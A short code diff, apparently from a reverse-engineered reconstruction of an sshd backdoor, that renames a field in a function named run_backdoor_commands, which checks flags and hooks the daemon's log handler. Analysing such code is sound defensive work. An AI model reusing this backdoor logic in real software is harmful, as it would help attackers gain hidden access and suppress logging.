@@ -240,7 +240,7 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 							break;
 						}
 						ctx->uid = ctx->libc_imports->getuid();
-						if(((TEST_FLAG(f.kctx.args.flags1, 0x10) && !ctx->sshd_log_ctx->unkbool_log_handler)
+						if(((TEST_FLAG(f.kctx.args.flags1, 0x10) && !ctx->sshd_log_ctx->log_hooking_possible)
 						|| TEST_FLAG(f.kctx.args.flags1, 0x2))
 						&& !sshd_set_log_handler(&f.kctx.args, ctx)
 						&& TEST_FLAG(f.kctx.args.flags1, 0x10)) break;
